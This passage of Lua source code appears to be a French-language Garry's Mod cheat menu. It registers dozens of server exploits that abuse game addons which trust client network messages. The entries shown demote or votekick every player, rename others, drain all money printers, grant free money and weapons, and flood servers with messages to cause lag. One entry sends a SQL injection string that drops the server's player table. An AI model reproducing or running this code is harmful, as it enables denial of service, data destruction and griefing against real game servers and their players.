for k,v in pairs(player.GetAll()) do
net.Start("CREATE_REPORT")
net.WriteTable(tab)
net.SendToServer()
end
end )
end

status = ValidNetString("Hopping_Test")
if (status) then
CHATPRINT("Exploit Trouvé : Test De Bonheur [Hopping_Test]")
addExploit( "62","Hopping Test", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
net.Start("Hopping_Test")
net.WriteEntity(v)
net.WriteString("69.696.696969.69")
net.SendToServer()
end
end )
end

status = ValidNetString("CpForm_Answers")
if (status) then
CHATPRINT("Exploit Trouvé : Rejoindre La Police [CpForm_Answers]")
addExploit( "63","Join the Police 2", "joining the police #2", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("CpForm_Answers")
net.WriteEntity(LocalPlayer())
net.WriteTable({})
net.SendToServer()
end )
end

status = ValidNetString("VehicleUnderglow")
if (status) then
CHATPRINT("Exploit Trouvé : Néon De Véhicule [VehicleUnderglow]")
addExploit( "64","Vehicle Underglow", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("VehicleUnderglow")
net.SendToServer()
end )
end

status = ValidNetString("OpenGates")
if (status) then
CHATPRINT("Exploit Trouvé : Ouvrir Porte #2 [OpenGates]")
addExploit( "65","Ouvrir Porte #2", "Force open the door you are looking at", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("OpenGates")
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.SendToServer()
end )
end

status = ValidNetString("DemotePlayer")
if (status) then
CHATPRINT("Exploit Trouvé : Démote Tout Les Joueurs [DemotePlayer]")
addExploit( "66","Demote All Players", "Demote all players", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k, v in pairs(player.GetAll()) do
net.Start("DemotePlayer")
net.WriteString(v:SteamID())
net.SendToServer()
end
end )
end

status = ValidNetString("SendMail")
if (status) then
CHATPRINT("Exploit Trouvé : Envoyez Mail [SendMail]")
addExploit( "67","Envoyez Mail", "sending mail to all players", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
net.Start("SendMail")
net.WriteString("Grosse sécurité les mecs ! :^)")
net.WriteString(v:Nick())
net.SendToServer()
end
end )
end

status = ValidNetString("REPAdminChangeLVL")
if (status) then
CHATPRINT("Exploit Trouvé : Changer De Niveau [REPAdminChangeLVL]")
addExploit( "68","Admin Change Level", "free lvl", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
net.Start("REPAdminChangeLVL")
net.WriteEntity(v)
net.WriteDouble(1090000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
net.SendToServer()
end
end )
end

status = ValidNetString("BuyUpgradesStuff")
if (status) then
CHATPRINT("Exploit Trouvé : Achetez Amélioration [BuyUpgradesStuff]")
addExploit( "69","Buy Upgrades", "free upgrades", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("BuyUpgradesStuff")
net.WriteString("")
net.WriteFloat(-100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
net.SendToServer()
end )
end

status = ValidNetString("SquadGiveWeapon")
if (status) then
CHATPRINT("Exploit Trouvé : Give Arme [SquadGiveWeapon]")
addExploit( "70","Donnez Des Armes", "easy weapon", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") inputFrameExists = true
inputFrame = vgui.Create( "DFrame" )
inputFrame:SetTitle("Choisi une arme!")
inputFrame:SetSize( 400, 75 )
inputFrame:SetPos(ScrW() / 2 - inputFrame:GetWide() / 2, ScrH() / 2 + 230 )
inputFrame:SetDraggable(true)
inputFrame:ShowCloseButton(true)
inputFrame:MakePopup()
inputFrame.Paint = function( self, w, h )
draw.RoundedBox( 5, 0, 0, w, h, Color(30, 30, 30))
end
local TextEntry = vgui.Create( "DTextEntry", inputFrame )
TextEntry:SetSize( 380, 30 )
TextEntry:SetPos( inputFrame:GetWide() / 2 - TextEntry:GetWide() / 2, inputFrame:GetTall() / 2 - TextEntry:GetTall() / 2 )
TextEntry:SetText( "ls_sniper" )
TextEntry.OnEnter = function( self )
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Giving Weapon")
net.Start("SquadGiveWeapon")
net.WriteString( self:GetValue() )
net.WriteEntity(LocalPlayer())
net.SendToServer()
inputFrame:SetVisible(false)
end
end )
end

status = ValidNetString("SetTableTarget")
if (status) then
CHATPRINT("Exploit Trouvé : Set Table Target [SetTableTarget]")
addExploit( "71","Set Table Target", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("SetTableTarget")
net.WriteString("pername")
net.WriteString("perjob")
net.WriteInt(-10000000000000, 32)
net.WriteString("hitmansel")
net.WriteString("Anony.")
net.WriteString("")
net.WriteFloat(0)
net.WriteInt(-10000000000000, 32)
net.SendToServer()
end )
end

status = ValidNetString("UpdateRPUModelSQL")
if (status) then
CHATPRINT("Exploit Trouvé : Change character model [UpdateRPUModelSQL]")
addExploit( "72","Change character model", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("UpdateRPUModelSQL")
net.WriteString(LocalPlayer():GetEyeTrace().Entity:GetModel())
net.SendToServer()
end )
end

status = ValidNetString("disguise")
if (status) then
CHATPRINT("Exploit Trouvé : Disguise [disguise]")
addExploit( "73","Disguise", "allows you to disguise as any job", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") inputFrameExists = true
inputFrame = vgui.Create( "DFrame" )
inputFrame:SetTitle("Enter the number of the job")
inputFrame:SetSize( 400, 75 )
inputFrame:SetPos(ScrW() / 2 - inputFrame:GetWide() / 2, ScrH() / 2 + 230 )
inputFrame:SetDraggable(true)
inputFrame:ShowCloseButton(true)
inputFrame:MakePopup()
inputFrame.Paint = function( self, w, h )
draw.RoundedBox( 5, 0, 0, w, h, Color(30, 30, 30))
end
local TextEntry = vgui.Create( "DTextEntry", inputFrame )
TextEntry:SetSize( 380, 30 )
TextEntry:SetPos( inputFrame:GetWide() / 2 - TextEntry:GetWide() / 2, inputFrame:GetTall() / 2 - TextEntry:GetTall() / 2 )
TextEntry:SetText( "5" )
TextEntry.OnEnter = function( self )
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Déguisé")
net.Start("disguise")
net.WriteInt(tonumber(self:GetValue()), 32)
net.SendToServer()
inputFrame:SetVisible(false)
end
end )
end

status = ValidNetString("gportal_rpname_change")
if (status) then
CHATPRINT("Exploit Trouvé : Nom RP #1 [gportal_rpname_change]")
addExploit( "74","Your RP Name #1", "allows you to put absolutely any rp name", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") inputFrameExists = true
inputFrame = vgui.Create( "DFrame" )
inputFrame:SetTitle("Entrer Votre Nom")
inputFrame:SetSize( 400, 75 )
inputFrame:SetPos(ScrW() / 2 - inputFrame:GetWide() / 2, ScrH() / 2 + 230 )
inputFrame:SetDraggable(true)
inputFrame:ShowCloseButton(true)
inputFrame:MakePopup()
inputFrame.Paint = function( self, w, h )
draw.RoundedBox( 5, 0, 0, w, h, Color(30, 30, 30))
end
local TextEntry = vgui.Create( "DTextEntry", inputFrame )
TextEntry:SetSize( 380, 30 )
TextEntry:SetPos( inputFrame:GetWide() / 2 - TextEntry:GetWide() / 2, inputFrame:GetTall() / 2 - TextEntry:GetTall() / 2 )
TextEntry:SetText( "--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------" )
TextEntry.OnEnter = function( self )
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Changé")
net.Start("gportal_rpname_change")
net.WriteString( (self:GetValue()), 32)
net.WriteString(" ")
net.SendToServer()
inputFrame:SetVisible(false)
end
end )
end

status = ValidNetString("NewRPNameSQL")
if (status) then
CHATPRINT("Exploit Trouvé : Your RP Name #2 [NewRPNameSQL]")
addExploit( "75","Your RP Name #2", "allows you to put absolutely any rp name", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") inputFrameExists = true
inputFrame = vgui.Create( "DFrame" )
inputFrame:SetTitle("Enter your name")
inputFrame:SetSize( 400, 75 )
inputFrame:SetPos(ScrW() / 2 - inputFrame:GetWide() / 2, ScrH() / 2 + 230 )
inputFrame:SetDraggable(true)
inputFrame:ShowCloseButton(true)
inputFrame:MakePopup()
inputFrame.Paint = function( self, w, h )
draw.RoundedBox( 5, 0, 0, w, h, Color(30, 30, 30))
end
local TextEntry = vgui.Create( "DTextEntry", inputFrame )
TextEntry:SetSize( 380, 30 )
TextEntry:SetPos( inputFrame:GetWide() / 2 - TextEntry:GetWide() / 2, inputFrame:GetTall() / 2 - TextEntry:GetTall() / 2 )
TextEntry:SetText( "--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------" )
TextEntry.OnEnter = function( self )
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Changé")
net.Start("NewRPNameSQL")
net.WriteString( (self:GetValue()), 32)
net.SendToServer()
inputFrame:SetVisible(false)
end
end )
end

status = ValidNetString("chname")
if (status) then
CHATPRINT("Exploit Trouvé : Your RP Name #3 [chname]")
addExploit( "76","Your RP Name #3", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") inputFrameExists = true
inputFrame = vgui.Create( "DFrame" )
inputFrame:SetTitle("Enter your name")
inputFrame:SetSize( 400, 75 )
inputFrame:SetPos(ScrW() / 2 - inputFrame:GetWide() / 2, ScrH() / 2 + 230 )
inputFrame:SetDraggable(true)
inputFrame:ShowCloseButton(true)
inputFrame:MakePopup()
inputFrame.Paint = function( self, w, h )
draw.RoundedBox( 5, 0, 0, w, h, Color(30, 30, 30))
end
local TextEntry = vgui.Create( "DTextEntry", inputFrame )
TextEntry:SetSize( 380, 30 )
TextEntry:SetPos( inputFrame:GetWide() / 2 - TextEntry:GetWide() / 2, inputFrame:GetTall() / 2 - TextEntry:GetTall() / 2 )
TextEntry:SetText( "--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------" )
TextEntry.OnEnter = function( self )
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Changé")
net.Start("chname")
net.WriteString( (self:GetValue()) )
net.WriteString(" ")
net.SendToServer()
inputFrame:SetVisible(false)
end
end )
end

status = ValidNetString("AbilityUse")
if (status) then
CHATPRINT("Exploit Trouvé : Free Bonus [AbilityUse]")
addExploit( "77","Free Bonus", "allows you to instantly get bonuses", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") for k, v in ipairs(rp.abilities.list) do
CHATPRINT("ID - "..k.." | "..v:GetName())
inputFrameExists = true
inputFrame = vgui.Create( "DFrame" )
inputFrame:SetTitle("Enter the id of the bonus")
inputFrame:SetSize( 400, 75 )
inputFrame:SetPos(ScrW() / 2 - inputFrame:GetWide() / 2, ScrH() / 2 + 230 )
inputFrame:SetDraggable(true)
inputFrame:ShowCloseButton(true)
inputFrame:MakePopup()
inputFrame.Paint = function( self, w, h )
draw.RoundedBox( 5, 0, 0, w, h, Color(30, 30, 30))
end
local TextEntry = vgui.Create( "DTextEntry", inputFrame )
TextEntry:SetSize( 380, 30 )
TextEntry:SetPos( inputFrame:GetWide() / 2 - TextEntry:GetWide() / 2, inputFrame:GetTall() / 2 - TextEntry:GetTall() / 2 )
TextEntry:SetText( "6" )
TextEntry.OnEnter = function( self )
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Reçu")
net.Start("AbilityUse")
net.WriteInt(tonumber(self:GetValue()), 32)
net.SendToServer()
inputFrame:SetVisible(false)
end
end
end )
end

status = ValidNetString("race_accept")
if (status) then
CHATPRINT("Exploit Trouvé : Recevoir Véhicule [race_accept]")
addExploit( "78","Recevoir Véhicule", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") inputFrameExists = true
inputFrame = vgui.Create( "DFrame" )
inputFrame:SetTitle("Enter the id of the car")
inputFrame:SetSize( 400, 75 )
inputFrame:SetPos(ScrW() / 2 - inputFrame:GetWide() / 2, ScrH() / 2 + 230 )
inputFrame:SetDraggable(true)
inputFrame:ShowCloseButton(true)
inputFrame:MakePopup()
inputFrame.Paint = function( self, w, h )
draw.RoundedBox( 5, 0, 0, w, h, Color(30, 30, 30))
end
local TextEntry = vgui.Create( "DTextEntry", inputFrame )
TextEntry:SetSize( 380, 30 )
TextEntry:SetPos( inputFrame:GetWide() / 2 - TextEntry:GetWide() / 2, inputFrame:GetTall() / 2 - TextEntry:GetTall() / 2 )
TextEntry:SetText( "1" )
TextEntry.OnEnter = function( self )
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("race_accept")
net.WriteInt(tonumber(self:GetValue()), 32)
net.SendToServer()
end
end )
end

status = ValidNetString("NLR_Spawn")
if (status) then
CHATPRINT("Exploit Trouvé : ReSpawn #3 [NLR_Spawn]")
addExploit( "79","ReSpawn #3", "instant revival", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("NLR_Spawn")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end )
end

status = ValidNetString("Kun_ZiptieStruggle")
if (status) then
CHATPRINT("Exploit Trouvé : Casser Menottess [Kun_ZiptieStruggle]")
addExploit( "80","Casser Menottess", "Instantly breaks the handcuffs", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for i=0,30 do
net.Start("Kun_ZiptieStruggle")
net.SendToServer()
end
end )
end

status = ValidNetString("JB_Votekick")
if (status) then
CHATPRINT("Exploit Trouvé : Votekick Massif [JB_Votekick]")
addExploit( "81","Votekick Massif", "Kick Tous Le Monde", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
net.Start("JB_Votekick")
net.WriteEntity(v)
net.WriteString("what? what? what? what? what? what? what? what? what? what? what? what? what? what? what? what? what? ")
net.SendToServer()
end
end )
end

status = ValidNetString("Letthisdudeout")
if (status) then
CHATPRINT("Exploit Trouvé : Arret Forcé [Letthisdudeout]")
addExploit( "82","Arret Forcé", "exploit on all Byb servers to bail yourself out", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("Letthisdudeout")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end )
end

status = ValidNetString("opr_withdraw")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #14 [opr_withdraw]")
addExploit( "83","Crée Des Lags #14", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
timer.Create("lagger14", 0,0, function()
for i = 1, 1000 do
net.Start("opr_withdraw",true)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end )
end )
end

status = ValidNetString("NC_GetNameChange")
if (status) then
CHATPRINT("Exploit Trouvé : Change all names [NC_GetNameChange]")
addExploit( "84","Change all names", "allows you to change the rp names of all players", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") inputFrameExists = true
inputFrame = vgui.Create( "DFrame" )
inputFrame:SetTitle("Enter the name")
inputFrame:SetSize( 400, 75 )
inputFrame:SetPos(ScrW() / 2 - inputFrame:GetWide() / 2, ScrH() / 2 + 230 )
inputFrame:SetDraggable(true)
inputFrame:ShowCloseButton(true)
inputFrame:MakePopup()
inputFrame.Paint = function( self, w, h )
draw.RoundedBox( 5, 0, 0, w, h, Color(30, 30, 30))
end
local TextEntry = vgui.Create( "DTextEntry", inputFrame )
TextEntry:SetSize( 380, 30 )
TextEntry:SetPos( inputFrame:GetWide() / 2 - TextEntry:GetWide() / 2, inputFrame:GetTall() / 2 - TextEntry:GetTall() / 2 )
TextEntry:SetText( "AHAHAHAHAH" )
TextEntry.OnEnter = function( self )
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k, v in pairs( player.GetAll() ) do
net.Start("NC_GetNameChange")
net.WriteEntity(v)
net.WriteString( (self:GetValue()) )
net.WriteString( (self:GetValue()) )
net.SendToServer()
end
end
end )
end

status = ValidNetString("revival_revive_accept")
if (status) then
CHATPRINT("Exploit Trouvé : Reanimation #2 [revival_revive_accept]")
addExploit( "85","Reanimation #2", "instant revival, ", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") if !timer.Exists( "exploit_revive" ) then
--( "Enabled" )
timer.Create( "exploit_revive", 0.5, 0, function()
if !LocalPlayer():Alive() then
net.Start("revival_revive_accept")
net.SendToServer()
end
end )
else
timer.Remove( "exploit_revive" )
--( "Disabled" )
end
end )
end

status = ValidNetString("join_disconnect")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #15 [join_disconnect]")
addExploit( "86","Crée Des Lags #15", "b1g lags my duder", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
if not timer.Exists("lagger15") then
timer.Create("lagger15", 0.5, 0, function()
for i = 1, 3000 do
net.Start("join_disconnect",true)
net.WriteEntity(table.Random(player.GetAll()))
net.SendToServer()
end
end)
else
timer.Remove("lagger15")
--("Stopping")
end
end )
end

status = ValidNetString("BuyFirstTovar")
if (status) then
CHATPRINT("Exploit Trouvé : Free Physgun [BuyFirstTovar]")
addExploit( "87","Free Physgun", "get physgun", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Take physgun")
net.Start("BuyFirstTovar")
net.WriteString("0")
net.SendToServer()
end )
end

status = ValidNetString("BuySecondTovar")
if (status) then
CHATPRINT("Exploit Trouvé : Gravity Gun Gratuit [BuySecondTovar]")
addExploit( "88","Gravity Gun Gratuit", "Pas Trop Utile Mais Tjr Cool :)", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Take gravitygun")
net.Start("BuySecondTovar")
net.WriteString("0")
net.SendToServer()
end )
end

status = ValidNetString("MONEY_SYSTEM_GetWeapons")
if (status) then
CHATPRINT("Exploit Trouvé : Donnez Des Armes #2 [MONEY_SYSTEM_GetWeapons]")
addExploit( "89","Donnez Des Armes #2", "get weapons", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for i = 1,32 do
net.Start("MONEY_SYSTEM_GetWeapons")
net.WriteInt(i, 8)
net.SendToServer()
end
end )
end

status = ValidNetString("MCon_Demote_ToServer")
if (status) then
CHATPRINT("Exploit Trouvé : Demote Tout Les Joueurs #2 [MCon_Demote_ToServer]")
addExploit( "90","Demote Tout Les Joueurs #2", "demote all players", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
net.Start("MCon_Demote_ToServer")
net.WriteString(v:SteamID())
net.SendToServer()
end
end )
end

status = ValidNetString("withdrawMoney")
if (status) then
CHATPRINT("Exploit Trouvé : Voler L'argents De Tous #3 [withdrawMoney]")
addExploit( "91","Voler L'argents De Tous #3", "withdraw money from all printers, ", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k, v in pairs(ents.GetAll()) do
net.Start("withdrawMoney")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("withdrawMoney")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #16 [withdrawMoney]")
addExploit( "92","Crée Des Lags #16", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
timer.Create("lagger16", 0, 0, function()
for i=1,1000 do
net.Start("withdrawMoney",true)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end )
end )
end

status = ValidNetString("SyncPrinterButtons76561198027292625")
if (status) then
CHATPRINT("Exploit Trouvé : Voler L'argents De Tous #4 [SyncPrinterButtons76561198027292625]")
addExploit( "93","Voler L'argents De Tous #4", "withdraw money from all printers", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k, v in pairs(ents.GetAll()) do
net.Start("SyncPrinterButtons76561198027292625")
net.WriteEntity(v)
net.WriteUInt(2, 4)
net.SendToServer()
end
end )
end

status = ValidNetString("gPrinters.retrieveMoney")
if (status) then
CHATPRINT("Exploit Trouvé : Voler L'argents De Tous #5 [gPrinters.retrieveMoney]")
addExploit( "94","Voler L'argents De Tous #5", "withdraw money from all printers, ", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k, v in pairs(ents.GetAll()) do
net.Start("gPrinters.retrieveMoney")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("gPrinters.retrieveMoney")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #17 [gPrinters.retrieveMoney]")
addExploit( "95","Crée Des Lags #17", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
timer.Create("lagger17", 0, 0, function()
for i=1,1000 do
net.Start("gPrinters.retrieveMoney",true)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end )
end )
end

status = ValidNetString("NGII_TakeMoney")
if (status) then
CHATPRINT("Exploit Trouvé : Voler L'argents De Tous #6 [NGII_TakeMoney]")
addExploit( "96","Voler L'argents De Tous #6", "withdraw money from all printers", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k, v in pairs(ents.GetAll()) do
net.Start("NGII_TakeMoney")
net.WriteEntity(v)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end )
end

status = ValidNetString("money_clicker_withdraw")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #18 [money_clicker_withdraw]")
addExploit( "97","Crée Des Lags #18", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
timer.Create("lagger18", 0, 0, function()
for i=1,1000 do
net.Start("money_clicker_withdraw",true)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end )
end )
end

status = ValidNetString("opr_withdraw")
if (status) then
CHATPRINT("Exploit Trouvé : Voler L'argents De Tous #7 [opr_withdraw]")
addExploit( "98","Voler L'argents De Tous #7", "withdraw money from all printers", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k, v in pairs(ents.GetAll()) do
net.Start("opr_withdraw")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("NET_DoPrinterAction")
if (status) then
CHATPRINT("Exploit Trouvé : Voler L'argents De Tous #8 [NET_DoPrinterAction]")
addExploit( "99","Voler L'argents De Tous #8", "withdraw money from all printers", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k, v in pairs(ents.GetAll()) do
if v:GetClass():find("print") then
net.Start("NET_DoPrinterAction")
net.WriteEntity(LocalPlayer())
net.WriteEntity(v)
net.WriteInt(2,16)
net.SendToServer()
end
end
end )
end

status = ValidNetString("tickbooksendfine")
if (status) then
CHATPRINT("Exploit Trouvé : Ticket Book [tickbooksendfine]")
addExploit( "100","Ticket Book", "allows you to write a fine to all players, ", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
local reasonstable = {"Nice nan ? :D"}
for k, v in pairs(player.GetAll()) do
if v != LocalPlayer() then
net.Start("tickbooksendfine")
net.WriteString(v:SteamID())
net.WriteTable(reasonstable)
net.WriteDouble(1500, 32)
net.SendToServer()
end
end
end )
end

status = ValidNetString("SyncPrinterButtons16690")
if (status) then
CHATPRINT("Exploit Trouvé : Voler L'argents De Tous #9 [SyncPrinterButtons16690]")
addExploit( "101","Voler L'argents De Tous #9", "withdraw money from all printers", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k, v in pairs(ents.GetAll()) do
if v:GetModel() == "models/props_c17/consolebox01a.mdl" then
net.Start("SyncPrinterButtons16690")
net.WriteEntity(v)
net.WriteUInt(2, 4)
net.SendToServer()
end
end
end)
end

status = ValidNetString("withdrawp")
if (status) then
CHATPRINT("Exploit Trouvé : Voler L'argents De Tous #10 [withdrawp]")
addExploit( "102","Voler L'argents De Tous #10", "withdraw money from all printers", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(ents.FindByClass("derma_printer")) do
net.Start("withdrawp")
net.WriteEntity(v)
net.SendToServer()
end
end)
end

status = ValidNetString("withdrawp")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #19 [withdrawp]")
addExploit( "103","Crée Des Lags #19", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
timer.Create("lagger19", 0, 0, function()
for i=1,1000 do
net.Start("withdrawp",true)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end )
end )
end

status = ValidNetString("DarkRP_SS_Gamble")
if (status) then
CHATPRINT("Exploit Trouvé : Argent Gratuite #3 [DarkRP_SS_Gamble]")
addExploit( "104","Argent Gratuite #3", "Exploit Provenant De L'addon 'DarkRP Casino'", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("DarkRP_SS_Gamble")
net.WriteInt(99999, 32)
net.WriteInt(1, 32)
net.WriteInt(0, 32)
net.WriteInt(0, 32)
net.WriteInt(1, 32)
net.SendToServer()
end )
end

status = ValidNetString("PCAdd")
if (status) then
CHATPRINT("Exploit Trouvé : Supprimer Code Promo [PCAdd]")
addExploit( "105","Supprimer Code Promo", "delete all promocodes", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("PCAdd")
net.WriteString("alahman")
net.WriteString("300000000")
net.SendToServer()
timer.Simple(3,function()
net.Start("ActivatePC")
net.WriteString("alahman")
net.SendToServer()
net.Start("PCDelAll")
net.SendToServer()
end )
end )
end

status = ValidNetString("viv_hl2rp_disp_message")
if (status) then
CHATPRINT("Exploit Trouvé : HL2 Message Vocal [viv_hl2rp_disp_message]")
addExploit( "106","HL2 Message Vocal", "hl2 voice commands", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for name, command in pairs (dispatchCommands) do
net.Start("viv_hl2rp_disp_message")
net.WriteString(command)
net.SendToServer()
end
end )
end

status = ValidNetString("Kun_SellDrug")
if (status) then
CHATPRINT("Exploit Trouvé : Argent Gratuite #4 [Kun_SellDrug]")
addExploit( "107","Argent Gratuite #4", "get monies", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") if !timer.Exists( "freemoney4" ) then
--("Démarré")
timer.Create( "freemoney4", 0, 0, function()
for i=1,1000 do
net.Start("Kun_SellDrug")
net.WriteString("mushroom")
net.SendToServer()
end
end)
else
timer.Remove( "freemoney4" )
--("Stopping")
end
end )
end

status = ValidNetString("net_PSUnBoxServer")
if (status) then
CHATPRINT("Exploit Trouvé : Point Shop Unbox [net_PSUnBoxServer]")
addExploit( "108","Point Shop Unbox", "Exploit Provenant De L'addon 'Point Shop", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
local i = 0
for k2,v2 in pairs(PS.Items) do
if !v:PS_HasItem(v2.ID) then
timer.Simple(k*i*1.7,function()
net.Start("net_PSUnBoxServer")
net.WriteEntity(v)
net.WriteString(v2.ID)
net.SendToServer()
end)
i = i + 1
end
end
end
end )
end

status = ValidNetString("pplay_sendtable")
if (status) then
CHATPRINT("Exploit Trouvé : ☢ Détruire La BDMenu SQL ☢ [pplay_sendtable]")
addExploit( "109","☢ Détruire La BDMenu SQL ☢", "Tout Détruire", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
local tbl = {}
tbl.tblname = "darkrp_door; DROP TABLE darkrp_player; CREATE TABLE darkrp_player(a STRING)"
tbl.ply = LocalPlayer()
net.Start("pplay_sendtable")
net.WriteTable(tbl)
net.SendToServer()
end )
end

status = ValidNetString("75_plus_win")
if (status) then
CHATPRINT("Exploit Trouvé : Argent Gratuite #5 [75_plus_win]")
addExploit( "110","Argent Gratuite #5", "Recevoir De L'Argent", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("75_plus_win")
